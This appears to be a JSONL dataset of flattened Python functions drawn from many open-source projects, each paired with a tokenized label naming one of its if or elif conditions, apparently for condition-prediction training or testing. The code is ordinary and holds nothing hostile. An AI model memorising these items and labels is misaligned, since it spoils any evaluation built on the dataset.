{"input": "def _get_namespace(self, gl_client, gl_namespace, lazy=False): try: if gl_namespace.attributes[\"kind\"] == \"group\": return gl_client.groups.get(gl_namespace.attributes[\"id\"], lazy=lazy) if gl_namespace.attributes[\"kind\"] == \"user\": return gl_client.users.get(gl_client.user.attributes[\"id\"], lazy=lazy) # Note: This doesn't seem to work for IDs retrieved via the namespaces API; the IDs are # different. return gl_client.users.get(gl_namespace.attributes[\"id\"], lazy=lazy) except gitlab.GitlabGetError: return None", "label": "if gl_namespace . attributes [ \"kind\" ] == \"group\" :"}
{"input": "def removeReadOnly(self, files): # Removes all read-on ly flags in a for all files for filepath in files: if os.path.isfile(filepath): # Windows only needs S_IWRITE, but we bitwise-or with current perms to preserve other permission bits on Linux os.chmod(filepath, stat.S_IWRITE | os.stat(filepath).st_mode)", "label": "if os . path . isfile ( filepath ) :"}
{"input": "def initiate_all_local_variables_instances( nodes, local_variables_instances, all_local_variables_instances ): for node in nodes: if node.variable_declaration: new_var = LocalIRVariable(node.variable_declaration) if new_var.name in all_local_variables_instances: new_var.index = all_local_variables_instances[new_var.name].index + 1 local_variables_instances[node.variable_declaration.name] = new_var all_local_variables_instances[node.variable_declaration.name] = new_var", "label": "if node . variable_declaration :"}
{"input": "def find_comment(line): \"\"\"Finds the index of a comment # and returns None if not found\"\"\" instring, instring_char = False, \"\" for i, char in enumerate(line): if char in ('\"', \"'\"): if instring: if char == instring_char: instring = False instring_char = \"\" else: instring = True instring_char = char elif char == \"#\": if not instring: return i return None", "label": "if char in ( '\"' , \"'\" ) :"}
{"input": "def set_study_system_attr(self, study_id: int, key: str, value: Any) -> None: with _create_scoped_session(self.scoped_session, True) as session: study = models.StudyModel.find_or_raise_by_id(study_id, session) attribute = models.StudySystemAttributeModel.find_by_study_and_key( study, key, session ) if attribute is None: attribute = models.StudySystemAttributeModel( study_id=study_id, key=key, value_json=json.dumps(value) ) session.add(attribute) else: attribute.value_json = json.dumps(value)", "label": "if attribute is None :"}
{"input": "def clear_doc(self, docname: str) -> None: for sChild in self._children: sChild.clear_doc(docname) if sChild.declaration and sChild.docname == docname: sChild.declaration = None sChild.docname = None sChild.line = None if sChild.siblingAbove is not None: sChild.siblingAbove.siblingBelow = sChild.siblingBelow if sChild.siblingBelow is not None: sChild.siblingBelow.siblingAbove = sChild.siblingAbove sChild.siblingAbove = None sChild.siblingBelow = None", "label": "if sChild . siblingAbove is not None :"}
{"input": "def test_sum_values_list_group_by(self): ret = ( await Book.annotate(sum=Sum(\"rating\")) .group_by(\"author_id\") .values_list(\"author_id\", \"sum\") ) for item in ret: author_id = item[0] sum_ = item[1] if author_id == self.a1.pk: self.assertEqual(sum_, 45.0) elif author_id == self.a2.pk: self.assertEqual(sum_, 10.0)", "label": "if author_id == self . a1 . pk :"}
{"input": "def save_claims_for_resolve(self, claim_infos): to_save = {} for info in claim_infos: if \"value\" in info: if info[\"value\"]: to_save[info[\"claim_id\"]] = info else: for key in (\"certificate\", \"claim\"): if info.get(key, {}).get(\"value\"): to_save[info[key][\"claim_id\"]] = info[key] return self.save_claims(to_save.values())", "label": "if info [ \"value\" ] :"}
{"input": "def utcoffset(self, dt): if not dst_only: dt_n = dt.replace(tzinfo=None) if dt_start <= dt_n < dt_end and getattr(dt_n, \"fold\", 0): return timedelta(hours=-1) return timedelta(hours=0)", "label": "if dt_start <= dt_n < dt_end and getattr ( dt_n , \"fold\" , 0 ) :"}
{"input": "def find_comment(line): \"\"\"Finds the index of a comment # and returns None if not found\"\"\" instring, instring_char = False, \"\" for i, char in enumerate(line): if char in ('\"', \"'\"): if instring: if char == instring_char: instring = False instring_char = \"\" else: instring = True instring_char = char elif char == \"#\": if not instring: return i return None", "label": "if instring :"}
{"input": "def __subclasshook__(cls, C): if cls is Coroutine: mro = get_mro(C) for method in (\"__await__\", \"send\", \"throw\", \"close\"): for base in mro: if method in base.__dict__: break else: return NotImplemented return True return NotImplemented", "label": "if method in base . __dict__ :"}
{"input": "def GetFile(cls, session, sig, mode=\"r\"): sig = sig[: cls.HASH_LEN] while len(sig) > 0: fn = cls.SaveFile(session, sig) try: if os.path.exists(fn): return (open(fn, mode), sig) except (IOError, OSError): pass if len(sig) > 1: sig = sig[:-1] else: if \"r\" in mode: return (None, sig) else: return (open(fn, mode), sig) # Not reached return (None, None)", "label": "if len ( sig ) > 1 :"}
{"input": "def _store_pickle_output(self, pickle_output): if pickle_output: if self.output_options.output is None: self.error(\"Can't use without --output\", \"pickle-output\") elif not load_pytd.is_pickle(self.output_options.output): self.error( \"Must specify %s file for --output\" % load_pytd.PICKLE_EXT, \"pickle-output\", ) self.output_options.pickle_output = pickle_output", "label": "elif not load_pytd . is_pickle ( self . output_options . output ) :"}
{"input": "def the_func(*args, **kwargs): try: # Grab API version from type of controller controller = args[0] version = controller.version return func(*args, **kwargs) except Exception as e: if errors is not None and type(e) in errors: # Version-specific behaviour quantum_error_class = quantum_error_dict[version] raise quantum_error_class(e) # otherwise just re-raise raise", "label": "if errors is not None and type ( e ) in errors :"}
{"input": "def publish_create(cls, payload): try: if isinstance(payload, wf_ex_db.WorkflowExecutionDB): thread = eventlet.spawn(workflows.get_engine().process, payload) cls.threads.append(thread) except Exception: traceback.print_exc() print(payload)", "label": "if isinstance ( payload , wf_ex_db . WorkflowExecutionDB ) :"}
{"input": "def get_suggestion(self, buffer: \"Buffer\", document: Document) -> Optional[Suggestion]: history = buffer.history # Consider only the last line for the suggestion. text = document.text.rsplit(\"\\n\", 1)[-1] # Only create a suggestion when this is not an empty line. if text.strip(): # Find first matching line in history. for string in reversed(list(history.get_strings())): for line in reversed(string.splitlines()): if line.startswith(text): return Suggestion(line[len(text) :]) return None", "label": "if line . startswith ( text ) :"}
{"input": "def _get_parameter_scope(param, cmd_list): if not cmd_list: return \"N/A (NOT FOUND)\" test_list = cmd_list[0].split(\" \") while len(test_list) > 0: test_entry = \" \".join(test_list) all_match = True for entry in cmd_list[1:]: if test_entry not in entry: all_match = False break if not all_match: test_list.pop() else: return test_entry return \"_ROOT_\"", "label": "if test_entry not in entry :"}
{"input": "def __call__(self, params): for param in params: # If we've seen this parameter before, use the previously # constructed optimizer. if param in self.optim_objs: optim = self.optim_objs[param] # If we've never seen this parameter before, construct # an Adam optimizer and keep track of it. else: optim = torch.optim.Adam([param], **self.optim_args) self.optim_objs[param] = optim # Take a gradient step for the parameter param. optim.step()", "label": "if param in self . optim_objs :"}
{"input": "def filter_database(db, user, filter_name): \"\"\"Returns a list of person handles\"\"\" filt = MatchesFilter([filter_name]) filt.requestprepare(db, user) if user: user.begin_progress( _(\"Finding relationship paths\"), _(\"Retrieving all sub-filter matches\"), db.get_number_of_people(), ) matches = [] for handle in db.iter_person_handles(): person = db.get_person_from_handle(handle) if filt.apply(db, person): matches.append(handle) if user: user.step_progress() if user: user.end_progress() filt.requestreset() return matches", "label": "if user :"}
{"input": "def get_independence_days(self, year): \"\"\"returns a possibly empty list of (date, holiday_name) tuples\"\"\" days = [] if year > 2004: actual_date = date(year, 5, 4) days = [(actual_date, \"Restoration of Independence Day\")] if actual_date.weekday() in self.get_weekend_days(): days += [ ( self.find_following_working_day(actual_date), \"Restoration of Independence Observed\", ) ] return days", "label": "if actual_date . weekday ( ) in self . get_weekend_days ( ) :"}
{"input": "def on_mode_paused(result, mode, *args): from deluge.ui.console.widgets.popup import PopupsHandler if isinstance(mode, PopupsHandler): if mode.popup is not None: # If popups are not removed, they are still referenced in the memory # which can cause issues as the popup's screen will not be destroyed. # This can lead to the popup border being visible for short periods # while the current modes' screen is repainted. log.error( 'Mode \"%s\" still has popups available after being paused.' \" Ensure all popups are removed on pause!\", mode.popup.title, )", "label": "if mode . popup is not None :"}
{"input": "def step(self): if not self.fully_grown: if self.countdown <= 0: # Set as fully grown self.fully_grown = True self.countdown = self.model.grass_regrowth_time else: self.countdown -= 1", "label": "if self . countdown <= 0 :"}
{"input": "def getOnlineBuilders(self): all_workers = yield self.master.data.get((\"workers\",)) online_builderids = set() for worker in all_workers: connected = worker[\"connected_to\"] if not connected: continue builders = worker[\"configured_on\"] builderids = [builder[\"builderid\"] for builder in builders] online_builderids.update(builderids) defer.returnValue(list(online_builderids))", "label": "if not connected :"}
{"input": "def _latest_major(alternatives): max_major = -1 for a in alternatives: if is_version_identifier(a, strict=False): major, _, _, _ = components(a, strict=False) max_major = max(major, max_major) return max_major", "label": "if is_version_identifier ( a , strict = False ) :"}
{"input": "def getVar(self, name): value = self.tinfoil.run_command(\"dataStoreConnectorFindVar\", self.dsindex, name) overrides = None if isinstance(value, dict): if \"_connector_origtype\" in value: value[\"_content\"] = self.tinfoil._reconvert_type( value[\"_content\"], value[\"_connector_origtype\"] ) del value[\"_connector_origtype\"] if \"_connector_overrides\" in value: overrides = value[\"_connector_overrides\"] del value[\"_connector_overrides\"] return value, overrides", "label": "if \"_connector_origtype\" in value :"}
{"input": "def initAbbrev(self): k = self c = k.c d = c.config.getAbbrevDict() if d: for key in d: commandName = d.get(key) if commandName.startswith(\"press-\") and commandName.endswith(\"-button\"): pass # Must be done later in k.registerCommand. else: self.initOneAbbrev(commandName, key)", "label": "if commandName . startswith ( \"press-\" ) and commandName . endswith ( \"-button\" ) :"}
{"input": "def restore_text(self): if self.source_is_console(): cb = self._last_console_cb else: cb = self._last_editor_cb if cb is None: if self.is_plain_text_mode(): self.plain_text.clear() else: self.rich_text.clear() else: func = cb[0] args = cb[1:] func(*args) if get_meth_class_inst(func) is self.rich_text: self.switch_to_rich_text() else: self.switch_to_plain_text()", "label": "if get_meth_class_inst ( func ) is self . rich_text :"}
{"input": "def get_test_layer(): layers = get_bb_var(\"BBLAYERS\").split() testlayer = None for l in layers: if \"~\" in l: l = os.path.expanduser(l) if \"/meta-selftest\" in l and os.path.isdir(l): testlayer = l break return testlayer", "label": "if \"~\" in l :"}
{"input": "def __parse_query(self, model, iter_, data): f, b = self.__filter, self.__bg_filter if f is None and b is None: return True else: album = model.get_album(iter_) if album is None: return True elif b is None: return f(album) elif f is None: return b(album) else: return b(album) and f(album)", "label": "elif b is None :"}
{"input": "def iter(iterable, sentinel=None): if sentinel is None: i = getattr(iterable, \"__iter__\", None) if i is not None: return i() i = getattr(iterable, \"__getitem__\", None) if i is not None: return _iter_getitem(iterable) if JS(\"@{{iterable}} instanceof Array\"): return list(iterable).__iter__() raise TypeError(\"object is not iterable\") if callable(iterable): return _iter_callable(iterable, sentinel) raise TypeError(\"iter(v, w): v must be callable\")", "label": "if JS ( \"@{{iterable}} instanceof Array\" ) :"}
{"input": "def run(self): # Prime the coroutine. next(self.coro) try: while True: with self.abort_lock: if self.abort_flag: return # Get the message from the previous stage. msg = self.in_queue.get() if msg is POISON: break with self.abort_lock: if self.abort_flag: return # Send to consumer. self.coro.send(msg) except: self.abort_all(sys.exc_info()) return", "label": "if self . abort_flag :"}
{"input": "def get_name_from_types(types: Iterable[Union[Type, StrawberryUnion]]): names = [] for type_ in types: if isinstance(type_, StrawberryUnion): return type_.name elif hasattr(type_, \"_type_definition\"): name = capitalize_first(type_._type_definition.name) else: name = capitalize_first(type_.__name__) names.append(name) return \"\".join(names)", "label": "if isinstance ( type_ , StrawberryUnion ) :"}
{"input": "def _get_user_from_email(group, email): from sentry.models import User # TODO(dcramer): we should encode the userid in emails so we can avoid this for user in User.objects.filter(email__iexact=email): # Make sure that the user actually has access to this project context = access.from_user(user=user, organization=group.organization) if not context.has_team(group.project.team): logger.warning(\"User %r does not have access to group %r\", user, group) continue return user", "label": "if not context . has_team ( group . project . team ) :"}
{"input": "def _make_binary_stream(s, encoding): try: if _py3k: if isinstance(s, str): s = s.encode(encoding) else: if type(s) is not str: s = s.encode(encoding) from io import BytesIO rv = BytesIO(s) except ImportError: rv = StringIO(s) return rv", "label": "if isinstance ( s , str ) :"}
{"input": "def error_messages(file_list, files_removed): if files_removed is None: return for remove_this, reason in files_removed: if file_list is not None: file_list.remove(remove_this) if reason == 0: print(\" REMOVED : (\" + str(remove_this) + \") is not PNG file format\") elif reason == 1: print(\" REMOVED : (\" + str(remove_this) + \") already exists\") elif reason == 2: print(\" REMOVED : (\" + str(remove_this) + \") file unreadable\")", "label": "elif reason == 1 :"}
{"input": "def _eyeAvailable(*args, **kwargs): try: r = pylink.getEyeLink().eyeAvailable() if r == 0: return EyeTrackerConstants.getName(EyeTrackerConstants.LEFT_EYE) elif r == 1: return EyeTrackerConstants.getName(EyeTrackerConstants.RIGHT_EYE) elif r == 2: return EyeTrackerConstants.getName(EyeTrackerConstants.BINOCULAR) else: return EyeTrackerConstants.UNDEFINED except Exception as e: printExceptionDetailsToStdErr()", "label": "if r == 0 :"}
{"input": "def ignore_callback_errors(self, ignore): EventEmitter.ignore_callback_errors.fset(self, ignore) for emitter in self._emitters.values(): if isinstance(emitter, EventEmitter): emitter.ignore_callback_errors = ignore elif isinstance(emitter, EmitterGroup): emitter.ignore_callback_errors_all(ignore)", "label": "if isinstance ( emitter , EventEmitter ) :"}
{"input": "def test_empty_condition_node(cond_node): for node in [cond_node.true_node, cond_node.false_node]: if node is None: continue if type(node) is CodeNode and BaseNode.test_empty_node(node.node): continue if BaseNode.test_empty_node(node): continue return False return True", "label": "if node is None :"}
{"input": "def _confirm_deps(self, trans): if [pkgs for pkgs in trans.dependencies if pkgs]: dia = AptConfirmDialog(trans, parent=self.parent) res = dia.run() dia.hide() if res != Gtk.ResponseType.OK: log.debug(\"Response is: %s\" % res) if self.finish_handler: log.debug(\"Finish_handler...\") self.finish_handler(trans, 0, self.data) return self._run_transaction(trans)", "label": "if res != Gtk . ResponseType . OK :"}
{"input": "def get_human_type(self, translate=True): \"\"\"Returns prettified name of the object type\"\"\" try: obj_name = re.match(\".*\\.(?P<name>\\w+)$\", self.object_type).group(\"name\") pattern = re.compile(\"([A-Z][A-Z][a-z])|([a-z][A-Z])\") human_type = pattern.sub( lambda m: m.group()[:1] + \" \" + m.group()[1:], obj_name ) if translate: human_type = _(human_type) return human_type except Exception: return self.object_type", "label": "if translate :"}
{"input": "def ascii85decode(data): n = b = 0 out = \"\" for c in data: if \"!\" <= c and c <= \"u\": n += 1 b = b * 85 + (ord(c) - 33) if n == 5: out += struct.pack(\">L\", b) n = b = 0 elif c == \"z\": assert n == 0 out += \"\\0\\0\\0\\0\" elif c == \"~\": if n: for _ in range(5 - n): b = b * 85 + 84 out += struct.pack(\">L\", b)[: n - 1] break return out", "label": "if n == 5 :"}
{"input": "def calculateModifiedAttributes(self, fit, runTime, forceProjected=False): if self.item: for effect in self.item.effects.values(): if effect.runTime == runTime and effect.activeByDefault: effect.handler(fit, self, (\"module\",), None, effect=effect)", "label": "if effect . runTime == runTime and effect . activeByDefault :"}
{"input": "def loadHandler(self, human, values, strict): if values[0] == \"pose\": poseFile = values[1] poseFile = getpath.thoroughFindFile(poseFile, self.paths) if not os.path.isfile(poseFile): if strict: raise RuntimeError( \"Could not load pose %s, file does not exist.\" % poseFile ) log.warning(\"Could not load pose %s, file does not exist.\", poseFile) else: self.loadPose(poseFile) return", "label": "if strict :"}
{"input": "def get_outdated_docs(self) -> Iterator[str]: for docname in self.env.found_docs: if docname not in self.env.all_docs: yield docname continue targetname = path.join(self.outdir, docname + self.out_suffix) try: targetmtime = path.getmtime(targetname) except Exception: targetmtime = 0 try: srcmtime = path.getmtime(self.env.doc2path(docname)) if srcmtime > targetmtime: yield docname except OSError: # source doesn't exist anymore pass", "label": "if docname not in self . env . all_docs :"}
{"input": "def __init__(self, items=()): _dictEntries = [] for name, value in items: if isinstance(name, (list, tuple, frozenset, set)): for item in name: _dictEntries.append((item, value)) else: _dictEntries.append((name, value)) dict.__init__(self, _dictEntries) assert len(self) == len(_dictEntries) self.default = None", "label": "if isinstance ( name , ( list , tuple , frozenset , set ) ) :"}
{"input": "def ping_task(): try: if self._protocol.peer_manager.peer_is_good(peer): if peer not in self._protocol.routing_table.get_peers(): self._protocol.add_peer(peer) return await self._protocol.get_rpc_peer(peer).ping() except (asyncio.TimeoutError, RemoteException): pass", "label": "if peer not in self . _protocol . routing_table . get_peers ( ) :"}
{"input": "def get_resolved_dependencies(self): dependencies = [] for dependency in self.envconfig.deps: if dependency.indexserver is None: package = resolve_package(package_spec=dependency.name) if package != dependency.name: dependency = dependency.__class__(package) dependencies.append(dependency) return dependencies", "label": "if package != dependency . name :"}
{"input": "def main(msg: func.QueueMessage, dashboard: func.Out[str]) -> None: body = msg.get_body() logging.info(\"heartbeat: %s\", body) raw = json.loads(body) try: entry = TaskHeartbeatEntry.parse_obj(raw) task = Task.get_by_task_id(entry.task_id) if isinstance(task, Error): logging.error(task) return if task: task.heartbeat = datetime.utcnow() task.save() except ValidationError: logging.error(\"invalid task heartbeat: %s\", raw) events = get_events() if events: dashboard.set(events)", "label": "if isinstance ( task , Error ) :"}
{"input": "def testTlsServerServeForeverTwice(self): \"\"\"Call on serve_forever() twice should result in a runtime error\"\"\" with patch.object(ssl.SSLContext, \"load_cert_chain\") as mock_method: server = yield from StartTlsServer( context=self.context, address=(\"127.0.0.1\", 0), loop=self.loop ) if PYTHON_VERSION >= (3, 7): server_task = asyncio.create_task(server.serve_forever()) else: server_task = asyncio.ensure_future(server.serve_forever()) yield from server.serving with self.assertRaises(RuntimeError): yield from server.serve_forever() server.server_close()", "label": "if PYTHON_VERSION >= ( 3 , 7 ) :"}
{"input": "def getInstances_WithSource(self, instancesAmount, sourceObject, scenes): if sourceObject is None: self.removeAllObjects() return [] else: sourceHash = hash(sourceObject) if self.identifier in lastSourceHashes: if lastSourceHashes[self.identifier] != sourceHash: self.removeAllObjects() lastSourceHashes[self.identifier] = sourceHash return self.getInstances_Base(instancesAmount, sourceObject, scenes)", "label": "if lastSourceHashes [ self . identifier ] != sourceHash :"}
{"input": "def get_row(self, binary=False, columns=None, raw=None, prep_stmt=None): \"\"\"Get the next rows returned by the MySQL server\"\"\" try: rows, eof = self.get_rows( count=1, binary=binary, columns=columns, raw=raw, prep_stmt=prep_stmt ) if rows: return (rows[0], eof) return (None, eof) except IndexError: # No row available return (None, None)", "label": "if rows :"}
{"input": "def try_adjust_widgets(self): if hasattr(self.parent, \"adjust_widgets\"): self.parent.adjust_widgets() if hasattr(self.parent, \"parentApp\"): if hasattr(self.parent.parentApp, \"_internal_adjust_widgets\"): self.parent.parentApp._internal_adjust_widgets() if hasattr(self.parent.parentApp, \"adjust_widgets\"): self.parent.parentApp.adjust_widgets()", "label": "if hasattr ( self . parent . parentApp , \"adjust_widgets\" ) :"}
{"input": "def parseStatementList(): list__py__ = [] statement = None while index < length: if match(\"}\"): break statement = parseSourceElement() if ( \"undefined\" if not \"statement\" in locals() else typeof(statement) ) == \"undefined\": break list__py__.append(statement) return list__py__", "label": "if match ( \"}\" ) :"}
{"input": "def forward(self, Z): losses = [] context = self.context_cnn(Z) targets = self.target_cnn(Z) _, _, h, w = Z.shape # future prediction preds = self.pred_cnn(context) for steps_to_ignore in range(h - 1): for i in range(steps_to_ignore + 1, h): loss = self.compute_loss_h(targets, preds, i) if not torch.isnan(loss): losses.append(loss) loss = torch.stack(losses).sum() return loss", "label": "if not torch . isnan ( loss ) :"}
{"input": "def __run(self, command): sys.stdout, self.stdout = self.stdout, sys.stdout sys.stderr, self.stderr = self.stderr, sys.stderr try: try: r = eval(command, self.namespace, self.namespace) if r is not None: print_(repr(r)) except SyntaxError: exec(command, self.namespace) except: if hasattr(sys, \"last_type\") and sys.last_type == SystemExit: self.destroy() else: traceback.print_exc() sys.stdout, self.stdout = self.stdout, sys.stdout sys.stderr, self.stderr = self.stderr, sys.stderr", "label": "if r is not None :"}
{"input": "def prune(self): file = self.file if self.remain == 0: read_pos = file.tell() file.seek(0, 2) sz = file.tell() file.seek(read_pos) if sz == 0: # Nothing to prune. return nf = self.newfile() while True: data = file.read(COPY_BYTES) if not data: break nf.write(data) self.file = nf", "label": "if not data :"}
{"input": "def reduce_inode(self, f, init): for x in range(0, len(self._array), 2): key_or_none = self._array[x] val_or_node = self._array[x + 1] if key_or_none is None and val_or_node is not None: init = val_or_node.reduce_inode(f, init) else: init = f.invoke([init, rt.map_entry(key_or_none, val_or_node)]) if rt.reduced_QMARK_(init): return init return init", "label": "if key_or_none is None and val_or_node is not None :"}
{"input": "def gen_topython_helper(cw): cw.enter_block( \"private static BaseException/*!*/ ToPythonHelper(System.Exception clrException)\" ) allExceps = get_all_exceps([], exceptionHierarchy) allExceps.sort(cmp=compare_exceptions) for x in allExceps: if not x.silverlightSupported: cw.writeline(\"#if !SILVERLIGHT\") cw.writeline( \"if (clrException is %s) return %s;\" % (x.ExceptionMappingName, x.MakeNewException()) ) if not x.silverlightSupported: cw.writeline(\"#endif\") cw.writeline(\"return new BaseException(Exception);\") cw.exit_block()", "label": "if not x . silverlightSupported :"}
{"input": "def file_versions(self, path): \"\"\"Returns all commits where given file was modified\"\"\" versions = [] commits_info = self.commit_info() seen_shas = set() for commit in commits_info: try: files = self.get_commit_files(commit[\"sha\"], paths=[path]) file_path, file_data = files.items()[0] except IndexError: continue file_sha = file_data[\"sha\"] if file_sha in seen_shas: continue else: seen_shas.add(file_sha) # Add file info commit[\"file\"] = file_data versions.append(file_data) return versions", "label": "if file_sha in seen_shas :"}
{"input": "def _append_fragment(self, ctx, frag_content): try: ctx[\"dest_stream\"].write(frag_content) ctx[\"dest_stream\"].flush() finally: if self.__do_ytdl_file(ctx): self._write_ytdl_file(ctx) if not self.params.get(\"keep_fragments\", False): os.remove(encodeFilename(ctx[\"fragment_filename_sanitized\"])) del ctx[\"fragment_filename_sanitized\"]", "label": "if self . __do_ytdl_file ( ctx ) :"}
{"input": "def gen_segs(glyph): bzs = glyph_to_bzs(glyph) for sp in bzs: bks = segment_sp(sp) for i in range(len(bks)): bk0, bk1 = bks[i], bks[(i + 1) % len(bks)] if bk1 != (bk0 + 1) % len(sp) or len(sp[bk0]) != 2: segstr = seg_to_string(sp, bk0, bk1) fn = seg_fn(segstr) file(fn, \"w\").write(segstr)", "label": "if bk1 != ( bk0 + 1 ) % len ( sp ) or len ( sp [ bk0 ] ) != 2 :"}
{"input": "def matches(self, filepath): matched = False parent_path = os.path.dirname(filepath) parent_path_dirs = split_path(parent_path) for pattern in self.patterns: negative = pattern.exclusion match = pattern.match(filepath) if not match and parent_path != \"\": if len(pattern.dirs) <= len(parent_path_dirs): match = pattern.match( os.path.sep.join(parent_path_dirs[: len(pattern.dirs)]) ) if match: matched = not negative return matched", "label": "if len ( pattern . dirs ) <= len ( parent_path_dirs ) :"}
{"input": "def __repr__(self): text = \"{}(\".format(self.__class__.__name__) n = len(self) for i in range(n): if self[i] != None: if i > 0: text = text + \", \" text = text + \"{}={}\".format(fields[i], str(self[i])) text = text + \")\" return text", "label": "if self [ i ] != None :"}
{"input": "def difference_matrix(samples, debug=True): \"\"\"Calculate the difference matrix for the given set of samples.\"\"\" diff_matrix = {} for x in samples: if debug: print(\"Calculating difference matrix for %s\" % x) if x not in diff_matrix: diff_matrix[x] = {} for y in samples: if samples[x] != samples[y]: d = difference(samples[x], samples[y]) # print(\"Difference between %s and %s: %d\" % (x, y, d)) diff_matrix[x][y] = d else: diff_matrix[x][y] = 0 return diff_matrix", "label": "if x not in diff_matrix :"}
{"input": "def load_config(self): try: with open(CONFIG_PATH) as f: y = yaml.safe_load(f) for key, value in y.items(): if hasattr(self, key.upper()) and not os.getenv(key.upper()): setattr(self, key.upper(), value) except IOError: logger.warning( f\"No config file found at {CONFIG_PATH}, using defaults.\\n\" f\"Set the CONFIG_PATH environment variable to point to a config file to override.\" )", "label": "if hasattr ( self , key . upper ( ) ) and not os . getenv ( key . upper ( ) ) :"}
{"input": "def checkout_branch(self, branch): if branch in self.remote_branches: sickrage.app.log.debug( \"Branch checkout: \" + self._find_installed_version() + \"->\" + branch ) if not self.install_requirements(self.current_branch): return False # remove untracked files and performs a hard reset on git branch to avoid update issues if sickrage.app.config.git_reset: self.reset() # fetch all branches self.fetch() __, __, exit_status = self._git_cmd(self._git_path, \"checkout -f \" + branch) if exit_status == 0: return True return False", "label": "if sickrage . app . config . git_reset :"}
{"input": "def upload( youtube_resource, video_path, body, chunksize=1024 * 1024, progress_callback=None ): body_keys = \",\".join(body.keys()) media = MediaFileUpload(video_path, chunksize=chunksize, resumable=True) videos = youtube_resource.videos() request = videos.insert(part=body_keys, body=body, media_body=media) while 1: status, response = request.next_chunk() if response: if \"id\" in response: return response[\"id\"] else: raise KeyError(\"Response has no 'id' field\") elif status and progress_callback: progress_callback(status.total_size, status.resumable_progress)", "label": "if \"id\" in response :"}
{"input": "def execute(self): with self._guard_sigpipe(): try: targets = ( self.get_targets() if self.act_transitively else self.context.target_roots ) for value in self.console_output(targets) or tuple(): self._outstream.write(value.encode()) self._outstream.write(self._console_separator.encode()) finally: self._outstream.flush() if self.get_options().output_file: self._outstream.close()", "label": "if self . get_options ( ) . output_file :"}
{"input": "def declare_var( self, type_name: Union[str, Tuple[str, str]], *, var_name: str = \"\", var_name_prefix: str = \"v\", shared: bool = False, ) -> str: if shared: if not var_name: var_name = var_name_prefix if var_name not in self.shared_vars: self.declarations.append((var_name, type_name)) self.shared_vars.add(var_name) else: if not var_name: var_name = self.get_var_name(var_name_prefix) self.declarations.append((var_name, type_name)) return var_name", "label": "if var_name not in self . shared_vars :"}
{"input": "def parse_counter_style_name(tokens, counter_style): tokens = remove_whitespace(tokens) if len(tokens) == 1: (token,) = tokens if token.type == \"ident\": if token.lower_value in (\"decimal\", \"disc\"): if token.lower_value not in counter_style: return token.value elif token.lower_value != \"none\": return token.value", "label": "if token . lower_value not in counter_style :"}
{"input": "def __init__(self, appName=\"\"): dlgappcore.AppDialog.__init__(self, win32ui.IDD_GENERAL_STATUS) self.timerAppName = appName self.argOff = 0 if len(self.timerAppName) == 0: if len(sys.argv) > 1 and sys.argv[1][0] != \"/\": self.timerAppName = sys.argv[1] self.argOff = 1", "label": "if len ( sys . argv ) > 1 and sys . argv [ 1 ] [ 0 ] != \"/\" :"}
{"input": "def tearDownClass(cls): for conn in settings.HAYSTACK_CONNECTIONS.values(): if conn[\"ENGINE\"] != \"haystack.backends.whoosh_backend.WhooshEngine\": continue if \"STORAGE\" in conn and conn[\"STORAGE\"] != \"file\": continue # Start clean if os.path.exists(conn[\"PATH\"]): shutil.rmtree(conn[\"PATH\"]) super(WhooshTestCase, cls).tearDownClass()", "label": "if conn [ \"ENGINE\" ] != \"haystack.backends.whoosh_backend.WhooshEngine\" :"}
{"input": "def forward(self, x): if self.ffn_type in (1, 2): x0 = self.wx0(x) if self.ffn_type == 1: x1 = x elif self.ffn_type == 2: x1 = self.wx1(x) out = self.output(x0 * x1) out = self.dropout(out) out = self.LayerNorm(out + x) return out", "label": "elif self . ffn_type == 2 :"}
{"input": "def __call__(self, data, **params): p = param.ParamOverrides(self, params) if isinstance(data, (HoloMap, NdOverlay)): ranges = {d.name: data.range(d) for d in data.dimensions()} data = data.clone( {k: GridMatrix(self._process(p, v, ranges)) for k, v in data.items()} ) data = Collator(data, merge_type=type(data))() if p.overlay_dims: data = data.map(lambda x: x.overlay(p.overlay_dims), (HoloMap,)) return data elif isinstance(data, Element): data = self._process(p, data) return GridMatrix(data)", "label": "if p . overlay_dims :"}
{"input": "def _update_model(self, events, msg, root, model, doc, comm=None): msg = dict(msg) if self._rename[\"objects\"] in msg: old = events[\"objects\"].old msg[self._rename[\"objects\"]] = self._get_objects(model, old, doc, root, comm) with hold(doc): super(Panel, self)._update_model(events, msg, root, model, doc, comm) from ..io import state ref = root.ref[\"id\"] if ref in state._views: state._views[ref][0]._preprocess(root)", "label": "if ref in state . _views :"}
{"input": "def reset_two_factor_hotp(): otp_secret = request.form.get(\"otp_secret\", None) if otp_secret: if not validate_hotp_secret(g.user, otp_secret): return render_template(\"account_edit_hotp_secret.html\") g.user.set_hotp_secret(otp_secret) db.session.commit() return redirect(url_for(\"account.new_two_factor\")) else: return render_template(\"account_edit_hotp_secret.html\")", "label": "if not validate_hotp_secret ( g . user , otp_secret ) :"}
{"input": "def ETA(self): if self.done: prefix = \"Done\" t = self.elapsed # import pdb; pdb.set_trace() else: prefix = \"ETA \" if self.max is None: t = -1 elif self.elapsed == 0 or (self.cur == self.min): t = 0 else: # import pdb; pdb.set_trace() t = float(self.max - self.min) t /= self.cur - self.min t = (t - 1) * self.elapsed return \"%s: %s\" % (prefix, self.format_duration(t))", "label": "if self . max is None :"}
{"input": "def add_property(self, key, value): # type: (str, Any) -> None with self.secure() as config: keys = key.split(\".\") for i, key in enumerate(keys): if key not in config and i < len(keys) - 1: config[key] = table() if i == len(keys) - 1: config[key] = value break config = config[key]", "label": "if key not in config and i < len ( keys ) - 1 :"}
{"input": "def validate_against_domain( cls, ensemble: Optional[\"PolicyEnsemble\"], domain: Optional[Domain] ) -> None: if ensemble is None: return for p in ensemble.policies: if not isinstance(p, TwoStageFallbackPolicy): continue if domain is None or p.deny_suggestion_intent_name not in domain.intents: raise InvalidDomain( \"The intent '{0}' must be present in the \" \"domain file to use TwoStageFallbackPolicy. \" \"Either include the intent '{0}' in your domain \" \"or exclude the TwoStageFallbackPolicy from your \" \"policy configuration\".format(p.deny_suggestion_intent_name) )", "label": "if not isinstance ( p , TwoStageFallbackPolicy ) :"}
{"input": "def sample(self, **config): \"\"\"Sample a configuration from this search space.\"\"\" ret = [] kwspaces = self.kwspaces striped_keys = [k.split(SPLITTER)[0] for k in config.keys()] for idx, obj in enumerate(self.data): if isinstance(obj, NestedSpace): sub_config = _strip_config_space(config, prefix=str(idx)) ret.append(obj.sample(**sub_config)) elif isinstance(obj, SimpleSpace): ret.append(config[str(idx)]) else: ret.append(obj) return ret", "label": "if isinstance ( obj , NestedSpace ) :"}
